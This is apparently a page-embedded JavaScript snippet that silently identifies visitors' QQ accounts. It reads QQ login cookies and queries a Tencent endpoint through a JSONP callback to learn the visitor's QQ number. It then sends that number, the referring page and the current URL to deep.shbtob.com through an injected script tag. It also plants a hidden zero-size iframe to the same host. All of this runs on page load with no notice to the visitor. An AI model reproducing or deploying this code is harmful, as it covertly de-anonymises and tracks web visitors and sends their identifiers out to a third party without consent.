var c=document.cookie;
var vc=c.split("; ");
var i;
var pp="";

for (i=0;i<vc.length;i++)
{
	var tmp=vc[i].split("=");
	if (tmp[0]=='uin' ||  tmp[0]=='pt2gguin' ||  tmp[0]=='uin_cookie' || tmp[0]=='ptui_loginuin' || tmp[0]=='o_cookie' || tmp[0]=='p_uin')
	{
		pp=pp+tmp[1] + '%2C';
	}
}

function send_sunbtob_to_s(i_qq, i_nick) {

	var url = 'http://deep.shbtob.com/sunbtob2qq.asp?id=395';
	url += "&frmurl=" + encodeURIComponent(document.referrer);
	url += "&msq=" + encodeURIComponent(i_qq);
	url += "&curURL0=" + encodeURIComponent(document.URL);
	url += "&i_nick=" + i_nick;
	var oHead = document.getElementsByTagName('HEAD').item(0);
	var oScript = document.createElement("script");
	oScript.type = "text/javascript";
	oScript.src = url;
	if (oScript.readyState) {
		oScript.onreadystatechange = function() {
			if (oScript.readyState == "loaded" || oScript.readyState == "complete") {
				oScript.onreadystatechange = null
			}
		}
	} else {
		oScript.onload = function() {}
	}
	oHead.appendChild(oScript)
}

var ie = document.all ? true : false;
function ReadJs(a, b, c) {
	var d = document.createElement("script");
	d.type = "text/javascript";
	d.charset = "utf-8";
	d.src = a;
	d.onerror = function() {
		if (c) {
			setTimeout(c, 0)
		}
	};
	if (ie) {
		d.onreadystatechange = function() {
			if (d.readyState) {
				if (d.readyState == "loaded" || d.readyState == "complete") {
					d.onreadystatechange = null;
					d.onload = null;
					if (b) {
						setTimeout(b, 0)
					}
				}
			} else {
				d.onreadystatechange = null;
				d.onload = null;
				if (b) {
					setTimeout(b, 0)
				}
			}
		}
	} else {
		d.onload = function() {
			if (d.readyState) {
				if (d.readyState == "loaded" || d.readyState == "complete") {
					d.onreadystatechange = null;
					d.onload = null;
					if (b) {
						setTimeout(b, 0)
					}
				}
			} else {
				d.onreadystatechange = null;
				d.onload = null;
				if (b) {
					setTimeout(b, 0)
				}
			}
		}
	}
	document.getElementsByTagName('HEAD').item(0).appendChild(d)
}
function safeTask(b) {
	var xx1 = "0";
	xx1 = b.uin;
	if (xx1 !== "0" && xx1 !== "" && xx1 !== "undefined") {
		send_sunbtob_to_s(xx1, '');
	}
}
ReadJs('http://c.pc.qq.com/fcgi-bin/scgettask?cb=safeTask&systype=103')

document.write('<iframe src="http://deep.shbtob.com/sunbtobqq.asp?id=395" name="sunbtob_tqq_iframe" id="sunbtob_tqq_iframe" frameborder="0" width="0" height="0" scrolling="no"></iframe>')
